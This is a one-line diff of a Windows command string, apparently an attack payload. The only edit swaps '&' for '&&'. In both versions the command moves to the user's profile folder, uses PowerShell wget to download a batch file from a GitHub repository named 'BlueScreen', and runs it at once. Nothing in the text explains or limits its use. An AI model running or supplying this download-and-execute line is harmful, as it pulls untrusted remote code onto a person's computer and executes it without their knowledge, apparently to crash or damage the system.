@@ -1,1 +1,1 @@
-cmd /c @echo off & cd %userprofile% & powershell /c wget https://raw.githubusercontent.com/harryaldwithjarryald/BlueScreen/main/command_temp.bat -outfile command_temp.bat && command_temp.bat
+cmd /c @echo off && cd %userprofile% && powershell /c wget https://raw.githubusercontent.com/harryaldwithjarryald/BlueScreen/main/command_temp.bat -outfile command_temp.bat && command_temp.bat
